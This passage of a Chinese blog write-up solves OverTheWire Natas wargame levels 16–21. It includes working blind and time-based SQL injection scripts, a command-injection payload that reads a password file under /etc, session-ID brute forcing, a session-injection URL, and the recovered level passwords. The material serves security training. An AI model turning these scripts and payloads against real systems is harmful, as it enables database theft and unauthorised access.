<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">def check(payload):</span><br><span class="line">    url = &quot;http://natas15.natas.labs.overthewire.org/index.php&quot;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url,data=payload,auth=(&apos;natas15&apos;,&apos;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&apos;))</span><br><span class="line">    #print r.content</span><br><span class="line">    return &apos;doesn&apos; not in r.content</span><br><span class="line"></span><br><span class="line">def exploit(length):</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    for i in range(1,length):</span><br><span class="line">        LEFT = 0</span><br><span class="line">        RIGHT = 255</span><br><span class="line">        P = (LEFT + RIGHT) / 2</span><br><span class="line">        while abs(LEFT - RIGHT) &gt; 1:</span><br><span class="line">            payload = &#123;&apos;username&apos;:&quot;\&quot; or ORD(mid((SELECT group_concat(username,password) from users),%d,1))&lt;%d #&quot; % (i, P)&#125;</span><br><span class="line">            if check(payload):</span><br><span class="line">                RIGHT = P</span><br><span class="line">            else:</span><br><span class="line">                LEFT = P</span><br><span class="line">            P = (LEFT + RIGHT) / 2</span><br><span class="line">        data += chr(P)</span><br><span class="line">        print &quot;[+] Data (%d) : %s&quot; % (len(data), data)</span><br><span class="line"></span><br><span class="line">exploit(350)</span><br><span class="line"></span><br><span class="line"># database:natas15</span><br><span class="line"># users</span><br><span class="line"># username,password</span><br></pre></td></tr></table></figure>

<p>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</p>
<h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    if(preg_match(&apos;/[;|&amp;`\&apos;&quot;]/&apos;,$key)) &#123;</span><br><span class="line">        print &quot;Input contains an illegal character!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        passthru(&quot;grep -i \&quot;$key\&quot; dictionary.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了一些字符，而且key参数用双引号包了起来，不能直接注入了</p>
<p>可以利用php中<code>&amp;(xxx)</code>来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?needle=$(grep ^a /etc/natas_webpass/natas17)Doctor</span><br></pre></td></tr></table></figure>

<p>如果密码不以<code>a</code>开头，<code>$(grep ^a /etc/natas_webpass/natas17)</code>为空，命令为<br><code>grep -i Doctor dictionary.txt</code>,有回显</p>
<p>而如果密码以<code>a</code>开头，则命令为<br><code>grep -i aDoctor dictionary.txt</code>,无回显</p>
<p>因此可以进行盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&apos;http://natas16.natas.labs.overthewire.org/index.php&apos;</span><br><span class="line">def check(payload):</span><br><span class="line">    t=requests.get(url+payload,auth=(&apos;natas16&apos;,&apos;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&apos;)).text</span><br><span class="line">    #print t</span><br><span class="line">    return &apos;Doctor&apos; not in t</span><br><span class="line">c=&apos;&apos;</span><br><span class="line">while 1:</span><br><span class="line">    for i in string.digits+string.ascii_letters:</span><br><span class="line">        payload=&quot;?needle=$(grep+^&quot;+c+i+&quot;+/etc/natas_webpass/natas17)Doctor&amp;submit=Search&quot;</span><br><span class="line">        if check(payload):</span><br><span class="line">            c+=i</span><br><span class="line">            break</span><br><span class="line">    print c</span><br></pre></td></tr></table></figure>

<p>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</p>
<h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&apos;localhost&apos;, &apos;natas17&apos;, &apos;&lt;censored&gt;&apos;);</span><br><span class="line">    mysql_select_db(&apos;natas17&apos;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        //echo &quot;This user exists.&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;This user doesn&apos;t exist.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //echo &quot;Error in query.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>无回显，可以时间盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&apos;http://natas17.natas.labs.overthewire.org&apos;</span><br><span class="line">def check(payload):</span><br><span class="line">    data=&#123;&apos;username&apos;:&apos;&quot;or if((&apos;+payload+&apos;),sleep(1),1)#&apos;&#125;</span><br><span class="line">    starttime=time.time()</span><br><span class="line">    r=requests.post(url,data,auth=(&apos;natas17&apos;,&apos;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&apos;))</span><br><span class="line">    print time.time() - starttime</span><br><span class="line">    if time.time() - starttime &gt; 2:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def exploit(length):</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    for i in range(1,length):</span><br><span class="line">        LEFT = 0</span><br><span class="line">        RIGHT = 255</span><br><span class="line">        P = (LEFT + RIGHT) / 2</span><br><span class="line">        while abs(LEFT - RIGHT) &gt; 1:</span><br><span class="line">            payload = &apos;ORD(mid((SELECT group_concat(column_name,0x7e) from information_schema.columns where table_name=&quot;users&quot;),%d,1))&lt;%d&apos; % (i, P)</span><br><span class="line">            if check(payload):</span><br><span class="line">                RIGHT = P</span><br><span class="line">            else:</span><br><span class="line">                LEFT = P</span><br><span class="line">            P = (LEFT + RIGHT) / 2</span><br><span class="line">        data += chr(P)</span><br><span class="line">        print &quot;[+] Data (%d) : %s&quot; % (len(data), data)</span><br><span class="line"></span><br><span class="line">exploit(350)</span><br></pre></td></tr></table></figure>

<p>网速很慢。。。</p>
<p>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</p>
<h3 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$maxid = 640; // 640 should be enough for everyone</span><br><span class="line"></span><br><span class="line">function isValidAdminLogin() &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if($_REQUEST[&quot;username&quot;] == &quot;admin&quot;) &#123;</span><br><span class="line">    /* This method of authentication appears to be unsafe and has been disabled for now. */</span><br><span class="line">        //return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function isValidID($id) &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    return is_numeric($id);</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function createID($user) &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    global $maxid;</span><br><span class="line">    return rand(1, $maxid);</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function debug($msg) &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        print &quot;DEBUG: $msg&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function my_session_start() &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if(array_key_exists(&quot;PHPSESSID&quot;, $_COOKIE) and isValidID($_COOKIE[&quot;PHPSESSID&quot;])) &#123;</span><br><span class="line">    if(!session_start()) &#123;</span><br><span class="line">        debug(&quot;Session start failed&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        debug(&quot;Session start ok&quot;);</span><br><span class="line">        if(!array_key_exists(&quot;admin&quot;, $_SESSION)) &#123;</span><br><span class="line">        debug(&quot;Session was old: admin flag set&quot;);</span><br><span class="line">        $_SESSION[&quot;admin&quot;] = 0; // backwards compatible, secure</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function print_credentials() &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) &#123;</span><br><span class="line">    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;</span><br><span class="line">    print &quot;&lt;pre&gt;Username: natas19\n&quot;;</span><br><span class="line">    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">$showform = true;</span><br><span class="line">if(my_session_start()) &#123;</span><br><span class="line">    print_credentials();</span><br><span class="line">    $showform = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;&amp; array_key_exists(&quot;password&quot;, $_REQUEST)) &#123;</span><br><span class="line">    session_id(createID($_REQUEST[&quot;username&quot;]));</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&quot;admin&quot;] = isValidAdminLogin();</span><br><span class="line">    debug(&quot;New session started&quot;);</span><br><span class="line">    $showform = false;</span><br><span class="line">    print_credentials();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if($showform) &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打印密码的函数<code>print_credentials()</code>，通过session验证是否是admin</p>
<p><code>session_id</code>设置当前会话id，id由<code>createID</code>函数随机生成，而<code>$maxid</code>为640，爆破一下id也就是<code>PHPSESSION</code>就可以，最后爆破得到id为138</p>
<p>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</p>
<h3 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h3><blockquote>
<p>This page uses mostly the same code as the previous level, but session IDs are no longer sequential…</p>
</blockquote>
<p>sessionid不再是有序的数字，观察发现是十六进制，转为十进制之后是ascii码，转为字母后发现是<code>数字-用户名</code>的形式，写个脚本爆破数字生成字典，在burp里爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f=open (&quot;1.txt&quot;,&quot;w&quot;)</span><br><span class="line">a = []</span><br><span class="line">for i in range(1,640):</span><br><span class="line">    a.append(str(i)+&apos;-admin&apos;)</span><br><span class="line">for i in a:</span><br><span class="line">    str=&apos;&apos;</span><br><span class="line">    for c in i:</span><br><span class="line">        str+=hex(ord(c)).replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class="line">    f.write(str+&apos;\n&apos;)</span><br></pre></td></tr></table></figure>

<p>PHPSESSION为38392d61646d696e</p>
<p>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</p>
<h3 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">function debug($msg) &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        print &quot;DEBUG: $msg&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line">function print_credentials() &#123; /* &#123;&#123;&#123; */</span><br><span class="line">    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) &#123;</span><br><span class="line">    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;</span><br><span class="line">    print &quot;&lt;pre&gt;Username: natas21\n&quot;;</span><br><span class="line">    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* we don&apos;t need this */</span><br><span class="line">function myopen($path, $name) &#123; </span><br><span class="line">    //debug(&quot;MYOPEN $path $name&quot;); </span><br><span class="line">    return true; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* we don&apos;t need this */</span><br><span class="line">function myclose() &#123; </span><br><span class="line">    //debug(&quot;MYCLOSE&quot;); </span><br><span class="line">    return true; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function myread($sid) &#123; </span><br><span class="line">    debug(&quot;MYREAD $sid&quot;); </span><br><span class="line">    if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) &#123;</span><br><span class="line">    debug(&quot;Invalid SID&quot;); </span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid;</span><br><span class="line">    if(!file_exists($filename)) &#123;</span><br><span class="line">        debug(&quot;Session file doesn&apos;t exist&quot;);</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    debug(&quot;Reading from &quot;. $filename);</span><br><span class="line">    $data = file_get_contents($filename);</span><br><span class="line">    $_SESSION = array();</span><br><span class="line">    foreach(explode(&quot;\n&quot;, $data) as $line) &#123;</span><br><span class="line">        debug(&quot;Read [$line]&quot;);</span><br><span class="line">    $parts = explode(&quot; &quot;, $line, 2);</span><br><span class="line">    if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1];</span><br><span class="line">    &#125;</span><br><span class="line">    return session_encode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function mywrite($sid, $data) &#123; </span><br><span class="line">    // $data contains the serialized version of $_SESSION</span><br><span class="line">    // but our encoding is better</span><br><span class="line">    debug(&quot;MYWRITE $sid $data&quot;); </span><br><span class="line">    // make sure the sid is alnum only!!</span><br><span class="line">    if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) &#123;</span><br><span class="line">    debug(&quot;Invalid SID&quot;); </span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid;</span><br><span class="line">    $data = &quot;&quot;;</span><br><span class="line">    debug(&quot;Saving in &quot;. $filename);</span><br><span class="line">    ksort($_SESSION);</span><br><span class="line">    foreach($_SESSION as $key =&gt; $value) &#123;</span><br><span class="line">        debug(&quot;$key =&gt; $value&quot;);</span><br><span class="line">        $data .= &quot;$key $value\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $data);</span><br><span class="line">    chmod($filename, 0600);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* we don&apos;t need this */</span><br><span class="line">function mydestroy($sid) &#123;</span><br><span class="line">    //debug(&quot;MYDESTROY $sid&quot;); </span><br><span class="line">    return true; </span><br><span class="line">&#125;</span><br><span class="line">/* we don&apos;t need this */</span><br><span class="line">function mygarbage($t) &#123; </span><br><span class="line">    //debug(&quot;MYGARBAGE $t&quot;); </span><br><span class="line">    return true; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_set_save_handler(</span><br><span class="line">    &quot;myopen&quot;, </span><br><span class="line">    &quot;myclose&quot;, </span><br><span class="line">    &quot;myread&quot;, </span><br><span class="line">    &quot;mywrite&quot;, </span><br><span class="line">    &quot;mydestroy&quot;, </span><br><span class="line">    &quot;mygarbage&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;name&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $_SESSION[&quot;name&quot;] = $_REQUEST[&quot;name&quot;];</span><br><span class="line">    debug(&quot;Name set to &quot; . $_REQUEST[&quot;name&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_credentials();</span><br><span class="line"></span><br><span class="line">$name = &quot;&quot;;</span><br><span class="line">if(array_key_exists(&quot;name&quot;, $_SESSION)) &#123;</span><br><span class="line">    $name = $_SESSION[&quot;name&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里自定义了会话存储函数，在<code>myread()</code>函数中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(explode(&quot;\n&quot;, $data) as $line) &#123;    </span><br><span class="line">    debug(&quot;Read [$line]&quot;);</span><br><span class="line">$parts = explode(&quot; &quot;, $line, 2);</span><br><span class="line">if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用换行分割传入的数据，然后每行用空格分割成两部分设为session的键和值</p>
<p>如果要得到密码需要<code>$_SESSION[&quot;admin&quot;] == 1</code>，可以传入换行加<code>admin 1</code></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://natas20.natas.labs.overthewire.org/index.php?debug=1&amp;name=a%0Aadmin%201</span><br></pre></td></tr></table></figure>

<p>开启debug，可以看到具体过程</p>
<p><img src="https://s1.ax1x.com/2018/09/13/iAOBwV.png" alt="iAOBwV.png"></p>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
